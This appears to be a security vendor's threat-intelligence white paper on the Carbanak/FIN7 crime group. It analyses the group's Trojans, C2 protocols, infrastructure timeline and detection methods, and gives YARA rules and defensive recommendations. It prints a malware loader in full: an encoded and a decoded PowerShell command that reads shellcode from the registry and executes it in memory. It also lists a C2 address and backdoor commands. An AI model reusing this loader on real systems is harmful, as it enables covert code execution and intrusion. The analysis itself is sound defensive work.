The name Carbanak\n[comes from “Carberp,” a banking Trojan whose source code was leaked, and](https://github.com/nyx0/Carberp)\n[Anunak, a custom Trojan that has evolved over the years. Since at least 2015,](https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html)\nthe group appears to have fragmented into smaller, loosely related groups,\neach with its own preferred toolsets and Trojans, although many similarities\nin tactics, techniques and procedures (TTPs) exist.\n\nUsing APT-style tactics and techniques, the perpetrators compromise an\norganization, quickly escalate privileges and begin searching for any system\nthat could access the financial data of interest. This ranges from scanning the\nnetwork via WMI to look for running process names containing clear text\ncredit card information, to monitoring a user’s screen to learn how to operate\nthe systems used to process financial information. Once they find these data\nand a method to access this financial information, they begin bulk harvesting.\n[If it is credit card track data, it can be turned around and sold on carder forums](https://en.wikipedia.org/wiki/Carding_(fraud))\nin bulk. ATM and SWIFT data require more and less legwork, respectively.\n\nBased on these tactics, the Carbanak/FIN7 syndicate is oftentimes\nconsidered an APT. Given our research, RSA disagrees with this classification.\nWhile the group is an extremely persistent threat, they are not advanced and\ndon’t demonstrate having access to zero-day exploits or innovative tools.\nThis gives network defenders the edge in protecting their financial data. With\nproper visibility and control sets in place, an analyst can easily identify these\ntechniques and remediate quickly, thus shortening attacker dwell time and\nhelping to prevent exfiltration of sensitive data.\n\nDuring the course of investigation, RSA Research observed Carbanak actors\nemploying a handful of unique Trojans, along with freely available malware,\nto persist and move laterally once a network foothold was established. While\nmany of these methods are novel, they are also well-known in the penetration\ntesting industry. This is most likely by design, as many of these remote\nadministration tools are frequently used by network administrators for\nlegitimate purposes and would not have antivirus coverage or seem out of the\nordinary. Employing the least sophisticated methods available, the Carbanak\nactors safeguard more advanced tools from being identified, and potentially\ninvalidated, through static or behavioral detection techniques.\n\n1\n\n\n-----\n\nThis paper reviews the characteristics of Carbanak’s known Trojans and\nTTPs to provide network defenders a better understanding of the group’s\ncapabilities and history. Armed with this knowledge, defenders should be able\nto better assess risk and allocate resources to the appropriate blind spots that\nplague most modern networked organizations.\n\n#### 2. THE DIGITAL ARSENAL\n**2.1. OVERVIEW**\nDuring the course of this effort, RSA observed many different Remote Access\nTrojans (RATs) associated with this group. Several are based on crimeware/\nbanker Trojans that are in use by different criminal actors, but are uniquely\ncustomized for Carbanak/FIN7. The following sections outline the capabilities\nof each RAT and discuss possible detection methods.\n\n2.1.1. Anunak/Sekur\nThe Anunak, or Sekur, Trojan has been—and may still be—the mainstay\nof the Carbanak/FIN7 syndicate. A custom configurable Trojan, it has\nundergone minor changes over the past several years, most notably to its\ncommunications protocols.\n\nThe Anunak/Sekur Trojan is a self-contained dropper/Trojan combination.\nIf executed outside of its configured path, it will entrench itself and remove\nthe original file. The Trojan is typically packed or “crypted” (a packer modified\nover time using encryption, encoding or compression methodologies), making\nstatic analysis difficult and rendering signatures useless. The Trojan begins\nby resolving Win32 API addresses and uses RtlDecompressBuffer to expand\nthe compressed payload DLL. The Trojan starts the Service Host executable,\nsvchost.exe, in a suspended state (Figure 1).\n\n_Figure 1: Create svchost.exe Suspended_\n\nThe malware then allocates executable memory inside the svchost.exe\naddress space, unpacks and injects the expanded DLL, and creates the main\nthread for the Anunak/Sekur malware. The Trojan is then copied into two\nstartup directories with a name based off the MAC address and machine\nname (Figures 2 and 3).\n\n2\n\n\n-----\n\n_Figure 2: Autoruns_\n\n_Figure 3: Entrenchment and Injection_\n\nThe Trojan then enumerates the running processes, looking for specific\nantivirus vendors and killing their worker processes to increase chances of\npersistence. The Trojan also drops and reads a configuration file with initial\ninstructions into the “C:\\ProgramData\\Mozilla\\” directory with a filename\nbased off the MAC address and machine name (Figure 4).\n\n_Figure 4: Anunak/Sekur Initial Configuration Example_\n\n[FireEye goes in-depth into the observed variants, commands the Trojan](https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html)\nreceives and configurations discovered in the wild. RSA NetWitness[®] Endpoint\ncan detect this injected DLL (Figure 5) and triggers many instant indicators of\ncompromise (IIOCs) (Figure 6) that ship with the product, by default.\n\n_Figure 5: Injected DLLs Detected by RSA NetWitness Endpoint_\n\n3\n\n\n-----\n\n_Figure 6: IIOCs Triggered in RSA NetWitness Endpoint_\n\nThe Anunak/Sekur Trojan may be configured to communicate with the\nCommand and Control [C2] server in two ways: via HTTP or a custom protocol\nto a hardcoded IP address. Often the Trojan is configured with both methods.\nThe HTTP request is easily detected with RSA NetWitness Logs and Packets\n[using the RSA NetWitness Hunting Pack and following the recommendations](https://community.rsa.com/docs/DOC-62341)\nin the HTTP section. The HTTP method uses the GET (Figure 7) and POST\n(Figure 8) methods to create a covert, bi-directional communication channel\nwith the C2. It generally has very few HTTP headers and oftentimes uses the\ndefault User-Agent configured in the Windows Registry.\n\n_Figure 7: Anunak/Sekur HTTP GET Request_\n\n4\n\n\n-----\n\n_Figure 8: Anunak/Sekur HTTP POST Request_\n\nThis type of HTTP C2 communication is common to many malware families\nand is a good reason to follow up any detection and not treat it as “routine.”\nPivoting into RSA NetWitness Endpoint and finding the module creating the\nconnections leads us to the injected DLLs and tracking data behavior (Figure 9).\n\n_Figure 9: Anunak/Sekur Network Tracking Data_\n\nSince RSA NetWitness Endpoint downloads the injected DLL, you can right-\nclick the DLL, select analyze and view the strings. The configuration path “C:\\\nProgramData\\Mozilla\\<varies>.bin” should be visible in the DLL’s strings, and\ndiscovery of this activity can be automated with a YARA signature.\n\n##### YARA Signature for Anunak/Sekur Injected DLL\n\nrule Carbanak_Anunak\n{\nmeta:\nauthor = “RSA FW”\n\nstrings:\n$mz   = { 4D 5A }\n$regex = /\\:\\\\ProgramData\\\\Mozilla\\\\.{12,20}\\.bin/\n\ncondition:\n$mz at 0 and $regex\n}\n\n5\n\n\n-----\n\nThe second method of C2, a custom TCP-based protocol, is more difficult\nto find. The protocol has evolved over the years—most recent observations\nshowing it’s now fully encrypted—making the data appear random. However,\nthere is a distinct handshake in the latest encrypted version. After the TCP\nhandshake, the Trojan sends packet with a 64-byte payload, which the server\nacknowledges. The Trojan then sends a packet with a 224-byte payload,\nwhich the server also acknowledges (Figure 10). This is followed by the server\nsending a packet with a 32-byte payload (Figure 11).\n\n_Figure 10: Handshake Request Sequence_\n\n_Figure 11: Handshake Response Request_\n\nWhen the RSA NetWitness packet decoder sees this sequence, the metadata\n“sekur handshake” is registered in the Indicators of Compromise field\n(Figure 12). While we have high confidence in these results, please be aware\nthat under rare circumstances this parser may false alarm on sessions\nthat have the same handshake pattern and aren’t actually the Trojan’s C2\ncommunications. Any Sekur handshake hits should be investigated on the\nhost using the above information on the behavior of this Trojan.\n\n6\n\n\n-----\n\n_Figure 12: Anunak/Sekur Handshake Metadata_\n\n**2.1.2. Carberp**\nThe Carberp banking Trojan is responsible for the first half of the name\n[Carbanak. This Trojan has been around at least since 2010 with the source](https://github.com/nyx0/Carberp)\n[code leaked in 2013.](https://github.com/nyx0/Carberp)\n\nCarberp was likely chosen by the actors for both its plug-in capability and\ncode availability. This provides some operational obscurity for Carbanak/\nFIN7, as numerous variants of this code were used (and remain in use)\n[by other Crimeware actors. RSA[®] Incident Response Services has dealt](https://www.rsa.com/en-us/services/rsa-risk-and-cybersecurity-practice/rsa-incident-response-practice)\nwith these specific Carbanak/FIN7 actors multiple times, with this variant\nanalyzed by RSA Research.\n\nThe droppers come in two versions, 32-bit and 64-bit. We will look at\nthe 32-bit version.\n\n##### Metadata\n\nFile Name: ml.exe\nFile Size: 96256 bytes\nMD5:     608b8bc44a59e2d5c6bf0c5ee5e1f517\nSHA1:     37de1791dca31f1ef85a4246d51702b0352def6d\nPE Time:  0x658ACD2B [Tue Dec 26 12:55:07 2023 UTC]\nSections (4):\nName  Entropy MD5\n.text   6.9      6b51c476e9cae2a88777ee330b639166\n.rdata 4.85     ad94fa5c9ff3adcdc03a1ad32cee0e3a\n.data  1.2      2e2bc95337c3b8eb05467e0049124027\n.rsrc   4.13     7396ce1f93c8f7dd526eeafaf87f9c2e\n\n_Figure 13: Carberp Dropper Metadata_\n\nThe first noticeable item is that the compile time seems to be in the future.\nIn RSA NetWitness Endpoint, the compile time can be added in the Global\nModules List and sorted on. The two extremes are generally where the\ninteresting modules can be found, either a very long time ago or sometime in\nthe future.\n\nWhen executed, the dropper checks to see if PowerShell is on the system and\nthen creates registry keys in “HKEY_CURRENT_USER\\Software\\Licenses.”\n“HKEY_CURRENT_USER” specifies the logged-on user profile, meaning this\nmalware will only launch when the user who ran the dropper logs on. This\ntechnique is oftentimes labelled as “file-less malware,” but the user’s Registry\n\n7\n\n\n-----\n\nOn Windows Vista and newer Microsoft operating systems, this is in C:\\\nUsers\\<username>\\; older Windows versions reside in C:\\Documents and\nSettings\\<username>\\.\n\nThis represents a problem for the incident responder, as the malware is not\npresent in memory, only in the registry, unless the specific user is logged\non. This is an interesting way to avoid detection by endpoint detection and\nresponse (EDR) tools. Using a bit of creativity and PowerShell, responders can\nbuild a script that queries for user profiles and retrieves the actual Registry\nHive or queries for the registry key itself.\n\nThe first registry key created is {01838681CA59881EA} and contains the\nbinary shellcode used to unpack the encoded payload DLL. The second key\nis {01838611EAC11772E} and contains a base 64 encoded PowerShell\ncommand (Figure 14).\n\n##### PowerShell Command Encoded\n\nw=new ActiveXObject(‘WScript.Shell’);w.Run(‘powershell.exe -noexit -enc\n“JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQB\nuAGMAZQA9ACcAUwB0AG8AcAAnAAoAJABzAD0AKABHAGUAdAAt\nAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACA\nASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATABpAGMA\nZQBuAHMAZQBzACkALgAnAHsAMAAxADgAMwA4ADYAOAAxAEMA\nQQA1ADkAOAA4ADEARQBBAH0AJwAKACQAbAA9ACQAcwAuAEwA\nZQBuAGcAdABoAAoAJABjAD0AQAAiAAoAWwBEAGwAbABJAG0AcA\nBvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF\n0ACgBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQ\nAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaA\nByAGUAYQBkACgASQBuAHQAUAB0AHIAIABhACwAdQBpAG4AdAAg\nAGIALABJAG4AdABQAHQAcgAgAGMALABJAG4AdABQAHQAcgAgAG\nQALAB1AGkAbgB0ACAAZQAsAEkAbgB0AFAAdAByACAAZgApADsAC\ngBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzA\nDIALgBkAGwAbAAiACkAXQAKAHAAdQBiAGwAaQBjACAAcwB0AGE\nAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgB\npAHIAdAB1AGEAbABBAGwAbABvAGMAKABJAG4AdABQAHQAcgAg\nAGEALAB1AGkAbgB0ACAAYgAsAHUAaQBuAHQAIABjACwAdQBpAG\n4AdAAgAGQAKQA7AAoAIgBAAAoAJABhAD0AQQBkAGQALQBUAHk\nAcABlACAALQBtAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbw\nBuACAAJABjACAALQBOAGEAbQBlACAAJwBXAGkAbgAzADIAJwAgA\nC0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4A\nYwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQAKACQAY\ngA9ACQAYQA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKA\nAwACwAJABsACwAMAB4ADMAMAAwADAALAAwAHgANAAwACkA\nCgBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB\n0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAG\n\n8\n\n\n-----\n\nEAbABdADoAOgBDAG8AcAB5ACgAJABzACwAMAAsACQAYgAsACQA\nbAApAAoAJABhADoAOgBDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZA\nAoADAALAAwACwAJABiACwAMAAsADAALAAwACkAfABPAHUAdA\nAtAE4AdQBsAGwA”’,0,0);\n\n_Figure 14: Encoded PowerShell Command_\n\n##### PowerShell Command Decoded\n\n$ErrorActionPreference=’Stop’\n$s=(Get-ItemProperty -Path HKCU:\\Software\\\nLicenses).’{01838681CA59881EA}’\n$l=$s.Length\n$c=@”\n\n[DllImport(“kernel32.dll”)]\npublic static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr\nd,uint e,IntPtr f);\n\n[DllImport(“kernel32.dll”)]\npublic static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);\n“@\n$a=Add-Type -memberDefinition $c -Name ‘Win32’ -namespace\nWin32Functions -passthru\n$b=$a::VirtualAlloc(0,$l,0x3000,0x40)\n\n[System.Runtime.InteropServices.Marshal]::Copy($s,0,$b,$l)\n$a::CreateThread(0,0,$b,0,0,0)|Out-Null\n\n_Figure 15: Decoded PowerShell Command_\n\nThis PowerShell script imports VirtualAlloc and CreateThread from Kernel32,\ncopies the shellcode to a segment of memory with PAGE_EXECUTE_\n**READWRITE [ 0x40] and creates a thread at the returned base of the allocated**\nmemory indicated by variable $b (Figure 15).

Other Windows Trojans**\nThe Carbanak/FIN7 syndicate appears to have ready access to an array of\ncommon crimeware and banker-style Trojans, as well as a few custom, yet\nrelatively simple, Trojans. This indicates that they either a) are part of the\ndevelopment team that built these Trojans or b) have access to the vendors\nthat sell these intrusion sets. The simplicity of their custom malware indicates\noption b might be likely; however, there is no direct evidence to support this\nconclusion. Compounding this issue, the attackers appear to have a solid\ngrasp on OPSEC, having evaded direct attribution thus far.\n\nThe common malware repurposed for targeted intrusions is listed below\nwith a brief description of each. This is worth mentioning so that a network\ndefender can alert on AV logs for these specific classifications. By using\nmalware that would be classified as a “common” threat, they are able to avoid\n\n11 intense scrutiny.\n\n\n-----\n\n|Trojan Family|Description|\n|---|---|\n|Andromeda/Gamarue|Backdoor commonly used to deliver banking Trojans; uses plug-ins like Carberp to extend functionality|\n|Qadars|Banking Trojan loosely based on leaked source code of Carberp and Zeus; supports plug-ins|\n|Meterpreter|Metasploit backdoor payload loader; very extensible|\n|Cobalt Strike|Full-featured Red Team software; unlicensed versions using the HTTP beacon contain the X-malware HTTP header|\n|Odaniff|Download and execute arbitrary files; run shell commands|\n\n\n##### Trojan Family Description\n\nAndromeda/Gamarue Backdoor commonly used to deliver banking\nTrojans; uses plug-ins like Carberp to extend\nfunctionality\n\nQadars Banking Trojan loosely based on leaked source\ncode of Carberp and Zeus; supports plug-ins\n\nMeterpreter Metasploit backdoor payload loader; very\nextensible\n\nCobalt Strike Full-featured Red Team software; unlicensed\nversions using the HTTP beacon contain the\nX-malware HTTP header\n\nOdaniff Download and execute arbitrary files; run shell\ncommands\n\nIn addition to common crimeware repurposed for targeted intrusions, these\nactors also engineer their own custom, albeit simplistic, Trojans. The following\nexample, “ctlmon.exe,” is indicative of their latest work.\n\n##### Carbanak/FIN7 Go Trojan\n\nFile Name: ctlmon.exe\nFile Size: 4392448 bytes\nMD5:    370d420948672e04ba8eac10bfe6fc9c\nSHA1:    450605b6761ff8dd025978f44724b11e0c5eadcc\nPE Time:  0x0    [Thu Jan 01 00:00:00 1970 UTC]\nSections (4):\nName   Entropy MD5\n.text   5.86   81e6ebbfa5b3cca1c38be969510fae07\n.data   5.17   17c39e9611777b3bcf6d289ce02f42a1\n.idata  3.49   b6cb3301099e4b93902c3b59dcabb030\n.symtab  0.02   07b5472d347d42780469fb2654b7fc54\n\nThis peculiar sample was simple in its implementation, but not simple to\n[analyze.

The malware moves the offset for the XOR key into RAX,\nthen into a QWORD (global variable calculated based on the length of the\nXOR key string into RCX), and then onto the stack before it calls “runtime_\nstringtoslicebyte” to decode the configuration (Figure 23).\n\n_Figure 23: Configuration XOR Key_\n\nWhen the malware starts, it will decode the command strings used in memory\nto avoid static detection and heuristics (Figure 24).\n\n_Figure 24: Decoded Trojan Commands_\n\n_A brief synopsis of the commands:_\n\n##### Command Function\n\n#ps Display process listing\n\n#shell Begin interactive command shell\n\n#kill Remove Windows Service and malware\n\n#info Get system information\n\n#wget Download function via wget HTTP\n\n#wput Upload function via wput FTP\n\n#name Get hostname of victim\n\n#service Install malware as Windows Service with Service\nName of ‘WindowsCtlMonitor’\n\nThe malware also queries the user’s default %TEMP% directory looking for\nthe xname.txt file and uploads to the C2 server. The malware does not create\nthis file; therefore, its functionality remains unknown at this time (Figure 25).\n\n14\n\n\n-----\n\n_Figure 25: Malware Reading Unknown File_\n\nThe malware beacons to 107.181.246[.]146 over TCP port 443 with a simple,\nsingle-byte XOR key that changes on every connection. The output is a single-\nbyte XOR command output; the malware simply redirects STDIN, STDOUT\nand STDERR across the encoded connection when it receives the #shell\ncommand (Figure 26).\n\n_Figure 26: Simple Command Shell_\n\nThis Trojan may be detected with the YARA signature, below.

ANUNAK HISTORICAL OVERVIEW\nThe following figures were compiled from Anunak/Sekur samples acquired from\n[VirusTotal. They were initially sorted by compile time, but this proved problematic](https://www.virustotal.com/#/home/upload)\nas many had compile times zeroed out (resulting in a compile date of January 1,\n1970) or were tampered with to infer future compile date. Consequently, the\nsamples were sorted by first submission to VirusTotal. The Trojans were often\nhardcoded with domains and IP addresses with a port. New indicators appear on\nthe graph next to their submission date. Please note that no pDNS for the domains\nwas added to the timeline due to the compile time vs. submission time irregularities.\n\nWhile there are many overlaps in infrastructure between 2014 (Figure 33)\ninto early 2015, the 2015 period (Figure 34) shows a dramatic slowdown in the\n[group’s activity. It is noteworthy that Kaspersky](https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf) [reported (in February 2015)](https://securelist.com/files/2015/02/Carbanak_APT_eng.pdf)\nthe group was responsible for stealing millions, if not billions, from banks during\n2013 and 2014. Several months later, the authorities made high-profile arrests\n[on charges of ATM fraud and SWIFT transfers and other direct account transfers.](http://www.pcworld.com/article/2915112/police-breaks-up-cybergang-that-stole-over-15-million-from-banks.html)\nThe observed lull in the group’s activity following this attribution and related\narrests indicates that some of the more prolific actors were either caught, ceased\ntheir activity, moved on, or changed their TTPs and continued operations.\n\nWhile each of these options is a possible truth, RSA Research believes that the\n2015 curtailment of activity reflects Carbanak operators, still reeling from a law\nenforcement takedown, reorganizing into a more loosely affiliated syndicate. As\nmentioned previously, the graph shows net-new infrastructure, and it’s worth\nit to note that in 2014 there were many different samples that communicated\nwith overlapping domains and IP addresses. The immense slowdown in 2015\nin new indicators, and the fact that the samples observed stopped reusing or\noverlapping domains and IPs, suggest a fragmentation—especially considering\nthat 2016 shows very little intersection of domains and IPs.\n\nThe 2016 period (Figure 35) shows an uptick in activity that included both reused and\nnew malware. This led us to believe the reorganized Carbanak syndicate recruited\nnew members, falling back on previously successful methods to exploit victim\nnetworks after gaining a foothold. This aligns with RSA Incident Response team’s field\nexperience, where actors using these same tactics and tools were found to be using\ncustom or completely different Trojans than Carberp and Anunak/Sekur, post 2015.\n\nThe 2017 time period (Figure 36), while not yet over, is relatively sparse compared to\nprevious years, possibly indicating this malware is at the end of its lifecycle. It is likely,\n\n22\n\n\n-----\n\n**2/10/2014**

OVERLAP WITH COMMON CRIMEWARE CAMPAIGNS\nDuring RSA Research’s analysis, an interesting link emerged to several crimeware\ncampaigns. This made sense, considering the prolific use of banker Trojans and\nother information-stealing Trojans by these groups. The Anunak/Sekur malware\nis the only unique family attributed to these groups. The rest are common,\nrepurposed malware. By pivoting on the known infrastructure with respect to when\nthe Trojans were active, RSA Research was able to discover a potential overlap.\n\n##### Linked Sample\n\nFile Name: face85f789faec82197703e296bd0c872f621902624b34c\n108f0460bc687ab70.exe\nFILE SIZE: 204800 BYTES\nMD5:    1E47E12D11580E935878B0ED78D2294F\nSHA1:    8230E932427BFD4C2494A6E0269056535B9E6604\nPE TIME: 0X534BD7C7 [MON APR 14 12:42:47 2014 UTC]\nPEID SIG:  MICROSOFT VISUAL C++ 8\nSECTIONS (5):\nNAME   ENTROPY MD5\n.TEXT          6.5    EAFBA59CAFA0E4FA350DFD3144E02446\n.RDATA        7.77   25617CE39E035E60FA0D71C2C28E1BF5\n.DATA         6.57   1284A97C9257513AAEBE708AC82C2E38\n.RSRC         4.91   F6207D7460A0FBDDC2C32C60191B6634\n.RELOC        4.01   2E7EEC2C3E7BA29FBF3789A788B4228E\n\nThe compile time of this sample does not appear to be tampered with.

RECOMMENDATIONS\n[The security lifecycle is the foundation for securing a network against](https://www.sans.org/reading-room/whitepapers/basics/security-lifecycle-managing-threat-592)\nexternal threats. But this foundation needs to be built upon and a culture of\nattention to detail, proactive monitoring and looking for blind spots. This can\nsometimes be tedious and seem unnecessary with the right mix of technology.\n\n[RSA Incident Response has weighed in on the current situation, given they](https://www.rsa.com/en-us/blog/2017-07/infosec-easy-button-myth)\nsee the effectiveness of many different types of instrumentation and network\nlayouts. The key takeaway from that post is for defenders to programmatically\nincrease their visibility while decreasing a potential attacker’s visibility and\naccess to sensitive data in a continuous cycle. This shortens attacker dwell\ntime when a breach occurs and limits exposure to financial loss.\n\nPreventing an intrusion cannot always be mitigated by thorough patching\nand good IT hygiene, though. In one case, these actors were able to exploit\na vulnerability in an internet-facing web application. In this case, the\norganization had a good patching regimen for their application servers;\nhowever, the software was a package and one of the components had a\nvulnerability that the vendor had not patched. While the story could have\nended there, it did not. The server was running a vulnerable Linux kernel,\n[allowing for escalated privileges using CVE-2016-5195, the “Dirty COW”](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195)\ncopy-on-write vulnerability. The attackers quickly installed a backdoor SSH\nand SSHD binary, but soon discovered the Linux environment used key-based\nauthentication. From here, the attackers abused the winbind service, which\nallows Windows Active Directory authentication on Linux hosts, to quickly\npivot to the Windows environment and carry on with their mission.\n\nThis is often the case with defense; planning is made more complicated once\nyou consider zero-day exploits—previously unknown vulnerabilities in existing\nsoftware. There are, undoubtedly, many zero days yet to be discovered in\ntoday’s commonly used software. So how is a defender to be effective with\nthe complexity of modern networks and software? By assuming a breach is\nalways underway. Hunt for indicators in network traffic and on hosts and look\nfor blind spots in that monitoring. At a minimum, an organization should log\nprivileged account usage remotely and know where credentials are stored.\n\n[Carbanak/FIN7 relies on variants of the mimikatz password-dumping](https://github.com/gentilkiwi/mimikatz)\nsoftware. Active Directory software is a fantastic tool to centralize\nauthentication and access control, as well as manage endpoints. This also\nbenefits a potential attacker, often providing the proverbial “keys to the\nkingdom” and an abstracted map of the network. The simplest reconnaissance\ntool to be aware of is a Windows native utility, ‘net.exe.’ More comprehensive\n[frameworks exist in the Recon module for PowerSploit or the Situational](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)\n[Awareness module for PowerShell Empire.](https://www.powershellempire.com/?page_id=285)\n\n32\n\n\n-----\n\nProper segmentation of the network could have also prevented the incident\ndescribed above. Had the DMZ of the internet-facing web hosts not had\naccess to the internal network segments, this would not have happened. This\ncan be taken a step further, segmenting financial data into its own network\nwith even tighter access controls and visibility. The industrial verticals that\nuse supervisory control and data acquisition (SCADA) networks to control\nmachinery running the world (such as power grids) use this methodology to\nreduce their attack surface. If a corporate user is spear phished and a Trojan\nis installed, it should be physically impossible to access these resources. The\nsame approach in storing and handling financial data should also be taken.\n\nPrevention is preferred, but in the modern threat environment, a security\nanalyst must assume a breach is in progress and scrutinize the network\naccordingly. Active hunting in network traffic and endpoint behavior and\nartifacts should be a daily task. Apex predators in nature have finely tuned\nsenses to hunt their prey; so should the modern security analyst.\n\nWith the right people, process and technology, organizations should be\nable to detect these Trojans and movement throughout the network, with\nease. If an organization is using the RSA NetWitness Suite, the parsers,\nmethodologies and YARA signatures described in this paper offer wide\ncoverage for this actor. While persistent, they have proven to not be\nadvanced, using tools and tactics available to every level of penetration\ntester. That they are even successful and worth mentioning should\ntell us that, as an industry, we’re still undergoing growing pains. With\ntechnological advancements coming at full speed, we need to be flexible in\nour understanding of the “what” and “how” we’re defending. We also need\nto be flexible in our understanding of the threats themselves, not make\nassumptions. No organization has the perfect security instrumentation and\nprocesses; it’s an ongoing cycle.\n\n#### 7. CONCLUSIONS\nThe Carbanak/FIN7 syndicate has had an interesting history over the past four-\nplus years of observation. The syndicate began targeting Russian and European\nbanking institutions, employing mules to run money from ATMs and direct\ntransfers to bank accounts. When the first report emerged in 2015 and following\nthe subsequent high-profile arrests, the group appeared to slow down and\nfragment into smaller sub-groups, possibly because members were arrested.\n\nThe syndicate then appeared to return in force in 2016 with a diversified\ndigital arsenal and target deck.
